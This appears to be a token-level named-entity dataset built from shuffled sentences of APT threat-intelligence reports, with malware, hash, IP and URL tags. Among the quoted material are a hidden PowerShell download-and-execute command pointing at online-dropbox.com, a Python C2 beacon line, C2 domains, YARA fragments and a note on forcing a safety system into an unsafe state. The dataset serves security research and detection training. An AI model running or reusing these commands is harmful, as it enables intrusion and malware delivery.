maturity O
was O
not O
the O
developers O
' O
native O
language O
. O

If O
so O
, O
is O
this O
simply O
a O
matter O
of O
accepted O
state O
espionage O
, O
or O
did O
it O
cross O
a O
line O
? O

2016 O
. O

This O
loop O
occurs O
many O
times O
, O
and O
each O
time O
it O
will O
also O
allocate O
a O
chunk O
of O
memory O
on O
the O
heap O
, O
performing O
math O
operations O
on O
it O
and O
printing O
it O
to O
the O
console O
over O
and O
over O
again O
. O

The O
last O
payload O
downloaded O
is O
a O
slightly O
modifi O
ed O
Gh0st B-malware.backdoor
RAT I-malware.backdoor
sample O
designed O
to O
act O
as O
a O
backdoor O
implant O
. O

Also O
, O
throughout O
the O
year O
and O
in O
previous O
years O
, O
researchers O
began O
to O
comment O
publicly O
on O
Sofacy O
's O
fairly O
consistent O
infrastructure O
setup O
. O

Figure O
25 O
: O
Cache O
filename O
Figure O
26 O
: O
Using O
mshta.exe O
to O
download O
additional O
payload O

The O
second O
push O
is O
the O
function O
to O
call O
and O
the O
first O
one O
is O
the O
address O
of O
the O
next O
basic O
block O
to O
jump O
to O
. O

The O
dropper O
then O
executes O
the O
utility O
using O
the O
command O
audiodg.exe O
/scomma O
scxrt2.ini O
. O

Tweet O
. O

The O
HTTP O
flood O
also O
appears O
to O
be O
intended O
as O
a O
rudimentary O
GET O
flood O
with O
a O
minimalist O
HTTP O
request O
header O
. O

Then O
it O
goes O
through O
four O
iterations O
of O
a O
loop O
that O
has O
no O
purpose O
other O
than O
to O
increment O
EBX O
by O
one O
on O
each O
iteration O
, O
resulting O
in O
a O
value O
of O
891 O
. O

We O
have O
identified O
several O
' O
subject O
tags O
' O
in O
the O
network O
communication O
: O
Down_0 O
, O
Down_1 O
, O
Happy_0 O
, O
Happy_2 O
and O
ddd_3 O
. O

This O
domain O
has O
been O
active O
since O
at O
least O
October O
2012 O
and O
has O
pointed O
to O
many O
different O
addresses O
in O
Syrian O
IP O
space O
on O
both O
the O
SyriaTel O
and O
Tarassul O
ISPs O
, O
as O
well O
as O
AnchorFree O
VPN O
addresses O
. O

The O
new O
discoveries O
included O
evidence O
related O
to O
past O
attempts O
to O
launch O
attacks O
against O
many O
of O
the O
same O
targets O
, O
including O
the O
aforementioned O
Commercial B-malware.infosteal
Bank I-malware.infosteal
International I-malware.infosteal
. O

Cyberkov O
recommends O
the O
following O
points O
in O
order O
to O
protect O
the O
victims O
from O
such O
malwares O
: O
Install O
DrWeb O
Security O
Space O
for O
Android O
( O
A O
leading O
Russian O
AntiVirus O
Company O
) O
Update O
your O
Android O
operating O
system O
regularly O
Use O
of O
DrWeb O
Telegram O
Bot O
( O
DrWebBot O
) O
to O
scan O
links O
and O
files O
shared O
on O
Telegram O
chats O
or O
groups O
Never O
install O
applications O
from O
unknown O
sources O
Use O
Telegram O
with O
Secret O
Chat O
feature O
only O
Always O
verify O
with O
your O
partners O
when O
sending O
and O
receiving O
files O
Install O
Zemana O
Mobile O
AntiVirus O
( O
A O
leading O
Turkish O
AntiMalware O
and O
AntiFraud O
Company O
) O
The O
following O
table O
summarizes O
the O
list O
of O
indicators O
to O
detect O
the O
malware O
: O

Both O
the O
THREEBYTE B-malware.backdoor
and O
HIGHTIDE B-malware.backdoor
backdoors O
were O
written O
to O
the O
same O
filepath O
of O
C O
: O
\DOCUMENTS O
and O
SETTINGS\ O
{ O
user O
} O
\LOCAL O
SETTINGS\Temp\word.exe O
. O

62749484f7a6b4142a2b5d54f589a950483dfcc9 B-hash
cb3a982e15ae382c0f6bdacc0fcecf3a9d4a068d B-hash

Only O
the O
best O
individuals O
or O
teams O
succeed O
, O
are O
paid O
, O
and O
remain O
in O
business O
. O

So O
far O
, O
more O
than O
30 O
APT O
and O
underground O
economy O
groups O
have O
been O
discovered O
and O
revealed O
. O

4.5.1 O
Network O

tmbmsrv.exe O
tmccsf.exe O
cntaosmgr.exe O
Trend O
Micro O
OfficeScan O
Add-on O
Service O
Client O
Management O
Service O

T O
here O
were O
traces O
of O
HyperBro B-malware.backdoor
in O
the O
infected O
data O
center O
from O
mid-November O
2017 O
. O

And O
here O
, O
an O
interest O
in O
military O
technologies O
is O
certainly O
within O
Sofacy O
purview O
. O

Fig O
7 O
. O

Chafer O
's O
activities O
have O
some O
links O
to O
another O
group O
known O
as O
Crambus O
( O
aka O
Oilrig O
) O
. O

fifa O
flash O
ftp O
gaming O
google O
google O

Once O
the O
lure O
's O
recipient O
opens O
and O
executes O
the O
file O
, O
a O
backdoor O
will O
be O
dropped O
into O
the O
victim O
's O
system O
. O

Using O
VirusTotal O
allowed O
the O
developer O
to O
make O
changes O
in O
an O
attempt O
to O
decrease O
antivirus O
detection O
. O

The O
metadata O
in O
the O
document O
shows O
that O
it O
was O
also O
titled O
' O
/ O
' O
, O
which O
happens O
to O
be O
the O
name O
of O
the O
Guidance O
Commission O
Office O
's O
Chief O
Executive O
: O
The O
naming O
convention O
and O
content O
of O
the O
file O
may O
indicate O
an O
attacker O
's O
familiarity O
with O
the O
nature O
of O
the O
victim O
. O

The O
SPC O
website O
contained O
JavaScript O
causing O
the O
client O
browser O
to O
load O
an O
iframe O
loading O
the O
contents O
of O
http://rootadmin2012.com, B-url.unknown
which O
was O
the O
main O
attack O
site O
for O
hosting O
the O
malicious O
payloads O
. O

Examining O
the O
memory O
image O
of O
a O
machine O
infected O
with O
the O
malware O
shows O
that O
a O
technique O
for O
infecting O
processes O
known O
as O
' O
process B-malware.unknown
hollowing I-malware.unknown
' O
is O
used O
. O

http://www.fireeye.com/blog/technical/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html B-url.normal
5 O
. O

© O
AhnLab O
, O
Inc O
. O

203.80.238.183 B-ip.unknown

We O
found O
an O
Android B-malware.infosteal
FinSpy I-malware.infosteal
Mobile I-malware.infosteal
sample O
in O
the O
wild O
with O
a O
command O
& O
control O
server O
in O
Vietnam O
that O
also O
exfiltrates O
text O
messages O
to O
a O
local O
phone O
number O
. O

We O
have O
observed O
DragonOK B-malware.infosteal
and O
Moafee B-malware.infosteal
use O
the O
Nflog B-malware.backdoor
implant O
in O
addition O
to O
an O
earlier O
version O
of O
the O
NewCT2 B-malware.backdoor
implant O
. O

In O
several O
cases O
, O
Symantec O
has O
been O
able O
to O
follow O
the O
entire O
chain O
of O
compromised O
routers O
and O
found O
it O
led O
to O
a O
virtual O
private O
server O
( O
VPS O
) O
, O
meaning O
the O
attackers O
have O
employed O
an O
additional O
layer O
of O
security O
by O
routing O
communications O
through O
rented O
hosting O
servers O
. O

The O
archaeological O
effort O
of O
understanding O
such O
a O
long­standing O
group O
can O
severely O
complicate O
victim O
identification O
. O

Mr O
. O

This O
is O
how O
the O
main O
module O
knows O
which O
modules O
should O
be O
downloaded O
to O
a O
particular O
target O
. O

EvilGrab B-malware.drop
steals O
internal O
user O
names O
and O
passwords O
as O
well O
as O
logs O
keystrokes O
. O

Agent.RUI O
Win32/TrojanDropper O
. O

We O
are O
calling O
the O
APT O
' O
Tempting B-malware.infosteal
Cedar I-malware.infosteal
Spyware I-malware.infosteal
' O
. O

// O
10003930 O
$ O
= O
' O
% O
08x%08x O
% O
08x%08x O
' O
wide O
ascii O
$ O
= O
' O
WinHttpGetIEProxyConfigForCurrentUser O
' O
wide O
ascii O
condition O
: O
( O
uint16 O
( O
0 O
) O
== O
0x5A4D O
or O
uint32 O
( O
0 O
) O
== O
0x4464c457f O
) O
and O
( O
all O
of O
them O
) O

The O
source O
port O
is O
randomly O
selected O
. O

No O
zero­day O
vulnerabilities O
have O
been O
found O
in O
the O
analysis O
of O
the O
samples O
obtained O
regarding O
this O
campaign O
. O

DLL B-malware.backdoor
preloading I-malware.backdoor
is O
a O
vulnerability O
that O
has O
been O
documented O
for O
over O
three O
years O
. O

Dynamic O
Function O
Calls O
: O
Iron B-malware.backdoor
Backdoor I-malware.backdoor
is O
also O
using O
the O
DynamicCall O
module O
from O
HackingTeam O
's O
' O
core O
' O
library O
. O

Figure O
6 O
shows O
the O
Python-style O
pseudo-code O
that O
calculates O
the O
hash O
for O
a O
function O
. O

The O
dropper O
is O
used O
to O
install O
the O
backdoor O
into O
the O
infected O
system O
and O
establish O
its O
persistence O
. O

The O
team O
is O
dedicated O
in O
APT O
attack O
investigation O
, O
threat O
incident O
response O
and O
underground O
economy O
industrial O
chain O
studies O
. O

Figure O
22 O
: O
ExtendedUIHoverTime O
Registry O
Key O
Change O
Figure O
22 O
: O
ExtendedUIHoverTime O
Registry O
Key O
Change O

Malware O
Analysis O
Report O
Operation O
Roman O
Holiday O
– O
Hunting O
the O
Russian O
APT28 O
group O

Avoid O
password O
policies O
that O
reduce O
the O
overall O
strength O
of O
credentials O
. O

Google-Privacy.doc O
( O
9c60fadece6ea770e2c1814ac4b3ae74 B-hash
) O
uploaded O
to O
VirusTotal O
on O
3 O
December O
2015 O

Where O
initially O
they O
had O
only O
a O
single O
fake O
domain O
pointed O
at O
CBI O
, O
now O
there O
were O
six O
additional O
domains O
, O
all O
used O
to O
target O
this O
single O
victim O
. O

However O
, O
we O
observe O
no O
direct O
links O
between O
Operation B-malware.ransom
Manul I-malware.ransom
and O
Arcanum O
. O

The O
C O
& O
C O
servers O
tend O
to O
operate O
from O
domains O
hosted O
on O
dynamic O
DNS O
. O

The O
statistics O
also O
show O
that O
the O
number O
of O
hits O
( O
and O
implicitly O
, O
the O
number O
of O
victims O
) O
is O
constantly O
increasing O
, O
as O
per O
the O
graphic O
below O
: O
3.1.1 O
. O

The O
.lnk O
file O
shown O
in O
Figure O
17 O
opens O
the O
malicious O
VBS O
dropped O
on O
the O
system O
. O

In O
general O
, O
their O
work O
is O
very O
professional O
and O
focused O
. O

C2 O
Server O
: O
algorithm.ddnsgeek[.]com B-url.cncsvr

The O
messages O
are O
parsed O
looking O
for O
information O
tagged O
with O
the O
following O
strings O
: O

Figure O
9 O
- O
Whois O
information O
about O
' O
marina-info.net B-url.unknown
' O

Figure O
2 O
: O
Example O
Flash O
object O
included O
via O
' O
Movie O
' O
property O
which O
specifies O
remote O
location O
of O
Flash O
object O
. O

Code O
in O
the O
malicious O
software O
closely O
matched O
usage O
on O
a O
control O
engineering O
blog O
dealing O
with O
PLCSIM O
( O
https://alexsentcha.wordpress.com/using-s7-prosim-with-siemens-s7-plcsim/ B-url.normal
and O
https://pcplcdemos.googlecode.com/hg/S7PROSIM/BioGas/S7%20v5.5/ B-url.normal
) O
. O

inbox.mailboxhus(.)com B-url.cncsvr
support.chatconnecting(.)com B-url.cncsvr
Flash.exe O
01ffc3ee5c2c560d29aaa8ac3d17f0ea4f6c0c09 B-hash
2016-12-28 O
09:51:13 O

The O
scrambled O
AES256 O
key O
is O
marked O
green O
, O
while O
the O
encrypted O
computer O
info O
is O
marked O
red O
. O

PhysicalDrive O
deviceIOControl O
0x2D1400 O
( O
IOCTL_STORAGE_QUERY_ O
PROPERTY O
) O
( O
VolSerialNumber O
) O

The O
ever-shifting O
threats O
and O
increasingly O
expanding O
attack O
surface O
will O
challenge O
users O
and O
enterprises O
to O
catch O
up O
with O
their O
security O
. O

These O
have O
to O
be O
32-bit O
processes O
, O
not O
already O
infected O
and O
not O
among O
a O
list O
of O
processes O
to O
avoid O
such O
as O
winlogon.exe O
, O
explorer.exe O
, O
cmd.exe O
or O
regsvr32.exe O
. O

We O
also O
found O
this O
attack O
group O
We O
observed O
both O
attack O
groups O
employ O
decoy O
documents O
in O
order O
to O
help O
deceive O
potential O
victims O
. O

The O
malware O
is O
located O
in O
the O
' O
< O
UserHomedir O
> O
/Library/Assistants/.local/ O
' O
path O
in O
a O
random O
directory O
with O
a O
name O
picked O
from O
a O
hardcoded O
list O
. O

Decrypted O
Value O

The O
exfiltration O
of O
sensitive O
data O
is O
done O
in O
order O
to O
coerce O
the O
victim O
into O
a O
business O
relationship O
under O
the O
threat O
of O
exchanging O
this O
information O
with O
competitors O
or O
leveraging O
it O
as O
part O
of O
the O
company O
's O
offering O
of O
' O
investment O
forecasting O
' O
. O

Once O
the O
packet O
is O
decrypted O
and O
decompressed O
, O
the O
data O
follow O
the O
format O
: O

In O
time O
, O
more O
evidence O
appeared O
and O
allowed O
us O
, O
and O
others O
, O
to O
link O
them O
together O
with O
high O
confidence O
. O

StrongPity O
previously O
set O
up O
TrueCrypt O
themed O
watering B-malware.backdoor
holes I-malware.backdoor
in O
late O
2015 O
. O

This O
activity O
by O
RIS O
is O
part O
of O
an O
ongoing O
campaign O
of O
cyber-enabled O
operations O
directed O
at O
the O
U.S. O
government O
and O
its O
citizens O
. O

Please O
contact O
us O
: O
openy0urm1nd@protonmail.ch O

The O
path O
of O
the O
main O
browser O
of O
the O
workstation O
is O
obtained O
by O
reading O
the O
registry O
value O
: O

In O
August O
2017 O
, O
the O
Indian O
National O
CERT O
published O
an O
advisory O
about O
malicious O
targeted O
campaigns O
. O

Here O
is O
an O
example O
of O
just O
one O
of O
China B-malware.backdoor
Chopper I-malware.backdoor
's O
text-based O
payloads O
( O
for O
more O
details O
, O
see O
' O
Payload O
Attributes O
' O
on O
Page O
11 O
) O
: O
ASPX O
: O

CTU O
researchers O
recommend O
that O
clients O
take O
appropriate O
precautions O
to O
minimize O
the O
risk O
of O
these O
types O
of O
attacks O
: O
Educate O
users O
about O
the O
risks O
of O
spearphishing O
emails O
. O

This O
analysis O
is O
based O
on O
information O
obtained O
from O
the O
media O
as O
well O
as O
technical O
reports O
of O
various O
malware O
research O
labs O
such O
as O
AhnLab O
, O
Imperva O
, O
Symantec O
, O
Avast O
, O
Kaspersky O
, O
Alienvault O
, O
and O
Sophos O
. O

ProcessExplorer O
is O
used O
to O
identify O
malware O
hiding O
inside O
a O
legitimate O
process O
as O
a O
DLL O
, O
which O
occurs O
as O
a O
result O
of O
DLL O
injection O
. O

It O
then O
infects O
existing O
operating O
system O
processes O
, O
connects O
to O
the O
command O
and O
control O
server O
, O
and O
begins O
data O
harvesting O
and O
exfiltration O
. O

rndismpc.sys O
mrxcls.sys O
mrxcls.sys O
( O
signed O
) O
rtniczw.sys O
( O
signed O
) O
jmidebs.sys O
( O
signed O
) O
.sys* O
.sys* O

When O
opened O
with O
a O
vulnerable O
version O
of O
Microsoft O
Word O
, O
the O
exploit O
will O
initiate O
the O
infection O
routine O
and O
display O
the O
legitimate O
document O
that O
follows O
: O
This O
document O
, O
written O
in O
Vietnamese O
, O
appears O
to O
be O
reviewing O
and O
discussing O
best O
practices O
for O
teaching O
and O
researching O
scientific O
topics O
. O

For O
any O
enquiries O
or O
sample O
submissions O
related O
to O
the O
subject O
, O
contact O
as O
at O
: O
threatintel@eset.com O
. O

During O
the O
time O
of O
analysis O
the O
text O
file O
downloaded O
from O
the O
Google O
drive O
link O
was O
populated O
with O
two O
private O
IP O
addresses O
, O
it O
looks O
like O
the O
attackers O
deliberately O
populated O
the O
IP O
addresses O
with O
two O
private O
IP O
addresses O
to O
prevent O
the O
researchers O
from O
determining O
actual O
IP/domain O
names O
of O
the O
backup O
C2 O
servers O
. O

Domain O

Until O
such O
evidence O
is O
made O
public O
, O
we O
will O
leave O
it O
to O
our O
readers O
to O
judge O
for O
themselves O
. O

dfiles5 O
= O
urlopen O
( O
' O
http://'+ O
getserver O
+ O
foldername+ O
' O
/online.php?sysname='+cname+ O
' O
' O
) O

In O
between O
those O
highly O
advanced O
attacks O
, O
more O
and O
more O
attackers O
possessing O
only O
a O
basic O
set O
of O
skills O
started O
to O
pop O
up O
– O
spreading O
well O
known O
RATs B-malware.backdoor
, O
obfuscated O
with O
generic O
publicly-available O
packers O
. O

The O
primary O
control O
logic O
can O
be O
found O
in O
the O
module O
registered O
under O
the O
service O
key O
( O
rasmon.dll O
, O
etc O
. O
) O

powershell O
-windowstyle O
hidden O
$ O
c= O
' O
( O
new-object O
System.Net.WebClient O
) O
.D'+'ownloadFile O
( O
' O
' O
' O
http://online-dropbox.com/online/a O
' O
' O
' O
, O
' O
' O
' O
$ O
env:tmp\gst.bat O
' O
' O
' O
) O
' O
; O
Invoke-Expression O
$ O
c&%tmp%\gst.bat O
' O
% O
CD O
% O
' O

Solutions O
that O
feature O
behavior O
monitoring O
, O
application O
control O
, O
email O
gateway O
monitoring O
, O
and O
intrusion/detection O
systems O
can O
help O
with O
this O
. O

Figure O
11 O
- O
The O
ThreatMap O

Attack O
Option O
3 O
: O
Reprogram O
the O
SIS O
to O
allow O
an O
unsafe O
state O
– O
while O
using O
the O
DCS O
to O
create O
an O
unsafe O
state O
or O
hazard O

To O
make O
traffic O
analysis O
and O
detection O
more O
difficult O
, O
the O
group O
uses O
a O
substitute O
cipher O
to O
obfuscate O
the O
data O
before O
it O
is O
sent O
to O
the O
C2 O
: O
Another O
way O
used O
to O
disguise O
the O
DNS O
traffic O
and O
lower O
the O
suspicions O
of O
SOC O
and O
NOC O
teams O
was O
the O
use O
IPs O
from O
address O
blocks O
of O
Microsoft O
and O
McAfee O
in O
the O
C2 O
responses O
: O
Once O
a O
command O
is O
received O
from O
the O
C2 O
server O
in O
the O
DNS O
response O
, O
the O
RAT B-malware.backdoor
will O
translate O
it O
to O
a O
corresponding O
command O
. O

Figure O
8 O
Data O
that O
has O
been O
written O
into O
module O
3 O

The O
results O
of O
this O
algorithm O
are O
then O
compared O
against O
three O
static O
values O
: O
0x1E00AFA B-hash
, O
0xBEE091E8 B-hash
and O
0xD46FCDFA B-hash
. O

Base64-decoded O
parameters O
z1 O
and O
z2 O
: O

This O
provider O
is O
popular O
with O
several O
Middle O
Eastern O
threat O
actors O
tracked O
by O
PwC O
's O
intelligence O
team O
. O

In O
some O
cases O
, O
the O
domains O
scanned O
were O
hosted O
on O
the O
same O
server O
; O
sometimes O
the O
attackers O
went O
through O
the O
list O
of O
possible O
domains O
matching O
a O
given O
IP O
. O

In O
2015 O
, O
SkyEye O
Labs O
, O
the O
security O
research O
division O
of O
the O
Chinese O
firm O
Qihoo O
360 O
, O
released O
a O
report O
detailing O
threat O
actors O
that O
were O
targeting O
Chinese O
public O
and O
private O
entities O
including O
government O
agencies O
, O
research O
institutes O
, O
maritime O
agencies O
, O
sea O
construction O
, O
and O
shipping O
enterprises O
. O

As O
we O
will O
see O
, O
identifying O
web O
shells B-malware.backdoor
can O
be O
much O
harder O
than O
finding O
malicious O
binaries O
. O

Essentially O
, O
this O
involves O
creating O
a O
remediation O
plan O
for O
effectively O
combating O
the O
threat O
and O
using O
round-the-clock O
intrusion O
detection O
and O
threat O
analysis O
to O
prevent O
attacks O
from O
entering O
the O
system O
. O

Popup O
message O
when O
the O
user O
opens O
the O
document O
that O
abuses O
Link O
Auto O
Update O

dwPktType O
= O
4 O
) O
. O

d5d99497ebb72f574c9429ecd388a019 B-hash
Mayo O
Uranio2011 O
3.6 O
G7fjZQYAH O
G7fjZQYAH O
kUHwdc8Y O
eYwJ6QX0i O
0pg6ooH O
0pg6ooH O
xjUfrQHP6Xy O
xjUfrQHP6Xy O
xjUfrQHP6Xy O
R9lmAhUK O
0pg6ooH O
1.3.6.16 O
QwcgY0a O
1.3.6.16 O
QwcgY0a O
1.3.6.16 O
1.3.6.16 O
1.3.6.16 O
KdXTsbjJ6 O
KdXTsbjJ6 O
UBt3eQq0 O
iodjmGyP3 O
UBt3eQq0 O

Messages O
to O
cover O
the O
funds O
for O
the O
payments O
were O
incorrectly O
created O
and O
sent O
. O

In O
2017 O
, O
the O
TeleBots O
group O
did O
n't O
stop O
their O
cyberattacks O
; O
in O
fact O
, O
they O
became O
more O
sophisticated O
. O

Once O
victims O
opened O
the O
lure O
document O
, O
Word O
will O
firstly O
visit O
a O
remote O
website O
of O
IE O
vbscript O
0day O
( O
CVE-2018-8174 B-malware.unknown
) O
to O
trigger O
the O
exploit O
. O

Other O
options O
would O
be O
the O
fixboot O
command O
from O
the O
Windows O
Recovery O
Console O
found O
on O
a O
Windows O
OS O
disk O
. O

In O
this O
new O
version O
, O
the O
malware O
uses O
POST O
requests O
with O
the O
following O
pattern O
: O
As O
the O
malware O
is O
injected O
into O
every O
process O
of O
the O
infected O
system O
, O
it O
creates O
named O
pipe O
in O
order O
to O
handle O
inter-processes O
communication O
. O

Most O
of O
the O
domains O
registered O
for O
C O
& O
C O
use O
in O
this O
campaign O
were O
done O
so O
through O
the O
free O
dynamic O
DNS O
Provider O
ChangeIP.com B-url.normal
. O

By O
Isaac O
Palmer O
April O
22 O
, O
2016 O
Introduction O
Cylance O
SPEARTM O
has O
identified O
an O
APT O
group O
which O
deploys O
multiple O
customized O
malware O
implants O
, O
targeting O
mainly O
Chinese O
and O
Russian O
users O
. O

Operation B-malware.ransom
Manul I-malware.ransom
is O
not O
particularly O
sophisticated O
, O
but O
it O
is O
well-understood O
that O
attacks O
do O
n't O
need O
to O
be O
sophisticated O
in O
order O
to O
be O
effective O
. O

Table O
2 O
shows O
some O
of O
the O
original O
files O
available O
for O
download O
shown O
with O
their O
MD5 O
hashes O
. O

Gibson O
, O
Owen O
. O

China B-malware.backdoor
Chopper I-malware.backdoor
is O
so O
small O
and O
simple O
that O
an O
attacker O
could O
conceivably O
type O
the O
contents O
of O
the O
shell O
by O
hand O
. O

Who O
is O
responsible O
? O

This O
discovery O
motivated O
researchers O
to O
search O
for O
other O
command O
& O
control O
servers O
to O
understand O
how O
widely O
FinFisher B-malware.backdoor
might O
be O
used O
. O

Other O
malware O
families O
such O
as O
Ixeshe/Etumbot B-malware.backdoor
, O
which O
are O
known O
to O
be O
used O
by O
Numbered O
Panda O
, O
also O
utilize O
this O
technique O
. O

Identical O
data O
collection O
function O
seen O
in O
both O
older O
and O
newer O
Nflog B-malware.backdoor
variants O

Because O
vbscript.dll O
imported O
msvcrt.dll O
, O
the O
msvcrt.dll O
base O
address O
was O
obtained O
by O
traversing O
the O
vbscript.dll O
import O
table O
, O
msvcrt.dll O
introduces O
kernelbase.dll O
, O
ntdll.dll O
, O
and O
finally O
the O
NtContinue O
, O
VirtualProtect O
function O
address O
was O
obtained O
. O

user_id O
is O
a O
hardcoded O
value O
in O
the O
malware O
binary O
that O
is O
sent O
to O
the O
control O
server O
. O

The O
decoy O
has O
usually O
been O
a O
PDF O
document O
but O
Flash O
videos O
have O
also O
been O
observed O
in O
some O
cases O
. O

Notify O
me O
whe O
n O
ne O
w O
comme O
nts O
are O
adde O
d O
. O

Latin O
America O
Region O
( O
LAR O
) O
: O
Brasil O
, O
México O
North O
America O
Region O
( O
NABU O
) O
: O
United O
States O
, O
Canada O
Europe O
, O
Middle O
East O
, O
& O
Africa O
Region O
( O
EMEA O
) O
: O
France O
, O
Deutschland O
/ O
Österreich O
/ O
Schweiz O
, O
Italia O
, O
Россия O
, O
España O
, O
United O
Kingdom O
/ O
Ireland O
Privacy O
Statement O
Legal O
Policies O
Copyright O
© O
2018 O
Trend O
Micro O
Incorporated O
. O

Much O
of O
i.e. O
kernel32.GetDefaultSystemLangID O
, O
kernel32.GetVersion O
, O
and O
kernel32.GetSystemInfo O
: O
collected O
with O
set O
of O
same O
calls O
, O
information O
● O
Default O
system O
codepage O
● O
Network O
adapter O
information O
● O
Processor O
architecture O
● O
Hostname O
and O
IP O
address O
● O
Windows O
OS O
and O
Service O
Pack O
versions O
Essentially O
, O
much O
of O
this O
information-stealer O
code O
is O
the O
same O
as O
that O
observed O
in O
previous O
attacks O
. O

The O
following O
array O
lists O
the O
modules O
contained O
in O
this O
Dino B-malware.backdoor
binary O
; O
the O
module O
names O
are O
those O
assigned O
by O
the O
developers O
. O

Segment O
networks O
into O
logical O
enclaves O
and O
restrict O
host-to-host O
communication O
paths O
. O

Previous O
General O
Dynamics O
Fidelis O
Cybersecurity O
Services O
( O
Fidelis O
) O
reporting O
, O
ref O
: O
Fidelis O
Threat O
Advisory O
( O
FTA O
) O
# O
1011 O
dated O
15 O
Jan O
2014 O
, O
introduced O
a O
malware O
system O
comprised O
of O
multiple O
files O
that O
provided O
a O
means O
for O
intruders O
to O
discover O
and O
retrieve O
data O
from O
disparate O
computer O
systems O
via O
removable O
storage O
devices O
. O

Tags O
: O
ChessMaster O
targeted O
attacks O

What O
are O
their O
functions O
? O

Use O
of O
Newly O
Created O
' O
Let O
's O
Encrypt O
' O
Certificate O
: O
A O
certificate O
observed O
being O
hosted O
on O
malicious O
infrastructure O
, O
likely O
used O
for O
some O
aspect O
of O
a O
malicious O
campaign O
, O
is O
a O
newly O
observed O
certificate O
( O
Figure O
12 O
) O
from O
a O
free O
provider O
that O
contains O
a O
hostname O
mismatch O
with O
the O
server O
itself O
. O

Simultaneously O
, O
the O
malicious O
DLL O
discards O
all O
calls O
to O
WriteDataBlockValue O
and O
instead O
calls O
WriteInputPoint O
( O
0x110 O
, O
0 O
, O
0x7763 O
) O
and O
WriteInputPoint O
( O
0x114 O
, O
0 O
, O
0x7763 O
) O
every O
millisecond O
. O

Both O
the O
THREEBYTE B-malware.backdoor
and O
HIGHTIDE B-malware.backdoor
backdoors O
were O
used O
in O
attacks O
targeting O
organizations O
in O
Taiwan O
. O

We O
'll O
describe O
how O
the O
attackers O
operate O
these O
backdoors O
, O
provide O
some O
scripts O
useful O
to O
further O
investigate O
the O
campaign O
as O
well O
as O
meanings O
to O
detect O
infections O
or O
scout O
for O
additional O
samples O
. O

// O
' O
/c O
' O
$ O
bytes04 O
= O
{ O
2f O
00 O
63 O
00 O
} O
//wcscmp O
( O
... O
$ O
hex_string O
= O
{ O
b9 O
? O
? O

In O
terms O
of O
defending O
and O
responding O
to O
malware O
, O
attribution O
is O
rarely O
important O
. O

The O
group O
may O
be O
trying O
new O
tricks O
to O
disrupt O
victims O
and O
delay O
their O
ability O
to O
respond O
– O
such O
as O
different O
message O
formats O
, O
and O
the O
deployment O
of O
ransomware O
across O
the O
victim O
's O
network O
as O
a O
smokescreen O
for O
their O
other O
activity O
. O

Network O
Security O
appliances O
such O
as O
NGFW O
, O
NGIPS O
, O
and O
Meraki O
MX O
can O
detect O
malicious O
activity O
associated O
with O
this O
threat O
. O

Afterwards O
, O
the O
persistence O
file O
will O
be O
created O
in O
/Library/LaunchDaemons/ O
or O

The O
program O
copies O
itself O
as O
< O
Hangul O
full O
path O
> O
HncReporter.exe O
and O
changes O
the O
default O
program O
association O
in O
the O
registry O
to O
open O
HWP O
documents O
. O

We O
searched O
for O
additional O
information O
about O
other O
users O
who O
had O
the O
same O
file O
, O
but O
were O
unable O
to O
find O
anything O
! O

The O
attacks O
against O
China O
have O
never O
stopped O
over O
the O
past O
10 O
years O
. O

Washington O
, O
DC O
. O

Structure O
returned O
by O
GetSystemInfo O
API O

In O
this O
analysis O
, O
we O
'll O
go O
over O
the O
file O
with O
a O
SHA256 O
hash O
of O
ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9 B-hash
. O

As O
shown O
in O
Figure O
26 O
, O
the O
egrep O
and O
regex O
commands O
are O
a O
powerful O
combination O
. O

Blue O
hash O
= O
probable O
IL O
target O
. O

Previously O
, O
Raphael O
worked O
as O
a O
security O
researcher O
for O
the O
US O
Air O
Force O
, O
a O
penetration O
tester O
, O
and O
he O
even O
invented O
a O
grammar O
checker O
that O
was O
sold O
to O
Automattic O
. O

Using O
a O
heuristic O
approach O
, O
it O
would O
be O
possible O
to O
detect O
the O
handshake O
of O
a O
possible O
Derusbi B-malware.backdoor
server O
variant O
session O
by O
looking O
for O
the O
following O
pattern O
: O
Exactly O
64 O
bytes O
transmitted O
First O
8 O
bytes O
taking O
the O
pattern O
of O
0x28 O
0x00 O
0x00 O
0x00 O
0x02 O
0x00 O
0x00 O
0x00 O

The O
view.hta O
contains O
the O
same O
PowerShell-based O
implant O
and O
establishes O
a O
remote O
connection O
over O
SSL O
to O
hxxps://200.122.181.63:443/components/com_tags/views/news.php B-url.unknown
. O

Fig O
4 O
. O

positive O

In O
fact O
, O
even O
the O
house O
numbers O
changed O
only O
slightly O
from O
one O
domain O
to O
the O
other O
. O

The O
internal O
name O
of O
this O
dll O
is O
{ O
7032F494-0562-4422-9C39-14230E095C52 O
} O
.dll O
but O
we O
've O
seen O
other O
versions O
like O
{ O
5248F13C-85F0-42DF-860D-1723EEAA4F90 O
} O
.dll O
. O

Besides O
, O
the O
malware O
is O
able O
to O
get O
the O
phone O
number O
, O
country O
and O
network O
operator O
name O
from O
cellular O
towers O
of O
the O
telecom O
company O
of O
the O
target O
. O

https://www.fidelissecurity.com/sites/default/files/FTA_1019_Ratcheting_Down_on_JSocket_A_PC_and_Android_Thre O
at_FINAL.pdf B-url.normal

If O
it O
is O
executed O
with O
no O
command-line O
parameters O
, O
it O
quits O
. O

Analysis O
of O
the O
Main O
ZxShell B-malware.backdoor
Module O

Besides O
the O
basic O
library O
( O
KBDLV2.DLL O
/ O
AUTO.DLL O
) O
that O
is O
responsible O
for O
common O
communication O
with O
its O
campaign O
master O
, O
we O
were O
able O
to O
find O
modules O
performing O
the O
following O
functions O
: O
Keystroke O
logging O
Directory O
listing O
collection O
HWP O
document O
theft O
Remote O
control O
download O
and O
execution O
Remote O
control O
access O
At O
system O
startup O
, O
the O
basic O
library O
disables O
the O
system O
firewall O
and O
any O
AhnLab O
firewall O
( O
a O
South O
Korean O
security O
product O
vendor O
) O
by O
zeroing O
out O
related O
values O
in O
registry O
: O

In O
a O
similar O
vein O
with O
past O
CyberBerkut O
activity O
, O
attackers O
hid O
behind O
anonymous O
activist O
groups O
like O
' O
anonpoland O
' O
, O
and O
data O
from O
victimized O
organizations O
were O
similarly O
leaked O
and O
' O
weaponized O
' O
. O

Analysis O
indicates O
the O
log O
file O
is O
probably O
stored O
in O
the O
clear O
, O
i.e. O
, O
the O
contents O
are O
not O
obfuscated O
. O

A O
' O
high O
confidence O
' O
judgment O
is O
not O
a O
fact O
or O
a O
certainty O
, O
however O
, O
and O
such O
judgments O
still O
carry O
a O
risk O
of O
being O
wrong O
